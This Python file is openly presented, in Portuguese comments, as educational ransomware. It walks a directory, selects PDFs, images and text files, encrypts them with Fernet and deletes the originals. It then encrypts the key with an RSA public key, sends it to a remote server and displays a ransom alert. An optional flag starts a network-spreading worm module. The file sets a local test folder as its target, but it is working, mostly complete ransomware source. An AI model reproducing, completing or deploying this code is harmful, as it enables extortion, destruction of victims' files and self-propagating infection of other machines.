'''
Etapas de um ransoware:
- Lista os arquivos (listdir);
- Identifica os arquivos alvos (checkFile);
- Criptografa os arquivos (encrypt);
- Emite um alerta para a vítima;
- Propagação (Worm) - Opcional;
'''
import base64
import argparse 
from pathlib import Path
from cryptography.fernet import Fernet
import os
import threading
import mimetypes
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from alert_show import mostrar_imagem
from client import send_encrypted_aes_key
from worm import iniciar_worm

BASE_DIR = Path(__file__).resolve().parent
PUBLIC_KEY_PATH = BASE_DIR / "public_key.pem"
ENCRYPTED_KEY_TXT_PATH = BASE_DIR / "key.bin.enc"

# --- Funções Auxiliares ---

def encrypt(file, key):
    fernet = Fernet(key)
    with open(file, "rb") as f:
        data = f.read()
    enc_data = fernet.encrypt(data)
    with open(f"{file}.enc", "wb") as f:
        f.write(enc_data)
        os.remove(file)

def checkFile(file):
    if mimetypes.guess_type(file)[0] in whitelist:
        files.append(file)

def listdir(path):
    try:
        for file in os.listdir(path):
            if os.path.isdir(f"{path}{file}"):
                dirs.append(f"{path}{file}/")
            else:
                checkFile(f"{path}{file}")
    except PermissionError:
        pass

def preparar_ambiente_teste():
    pasta = Path("./arquivos_teste/")
    if not pasta.exists():
        pasta.mkdir()
        (pasta / "documento_importante.txt").write_text("Dados sensíveis de teste.")
        print(f"[+] Pasta {pasta} criada com arquivos de teste.")

# --- Lógica Principal ---

def main():
    # Configuração de Argumentos
    parser = argparse.ArgumentParser(description="Ransomware Didático com Módulo Worm Opcional")
    parser.add_argument("--worm", action="store_true", help="Ativa a propagação automática pela rede (Worm)")
    args = parser.parse_args()

    preparar_ambiente_teste()
    
    global files, whitelist, dirs
    files = []
    whitelist = ["application/pdf", "image/jpeg", "image/png", "text/plain"]
    dirs = []
    
    # Listagem local
    listdir("./arquivos_teste/")

    if len(dirs) > 0:
        threads = []
        for d in dirs:
            t = threading.Thread(target=listdir, args=(d,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

    # Geração de Chave e Criptografia RSA
    key = Fernet.generate_key()
    
    with open(PUBLIC_KEY_PATH, "rb") as f:
        public_key = serialization.load_pem_public_key(f.read())

    enc_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Salvar e enviar a chave ao atacante
    with open("key.bin.enc", "wb") as f:
        f.write(enc_key)

    encrypted_key_b64 = base64.b64encode(enc_key).decode("utf-8")
    ENCRYPTED_KEY_TXT_PATH.write_text(encrypted_key_b64, encoding="utf-8")
    
    try:
        send_encrypted_aes_key(encrypted_key_b64)
    except Exception as e:
        print(f"[-] Falha ao enviar chave para o servidor: {e}")

    # Criptografia dos arquivos locais
    for file in files:
        t = threading.Thread(target=encrypt, args=(file, key,))
        t.start()

    # Execução do Módulo Worm (Se o argumento --worm for passado)
    if args.worm:
        print("[*] Módulo Worm ativado. Iniciando propagação...")
        # Executa em uma thread separada para não travar a exibição da imagem
        threading.Thread(target=iniciar_worm).start()
    else:
        print("[*] Módulo Worm desativado. Execução apenas local.")

    # Exibição do alerta
    mostrar_imagem()

if __name__ == "__main__":
    main()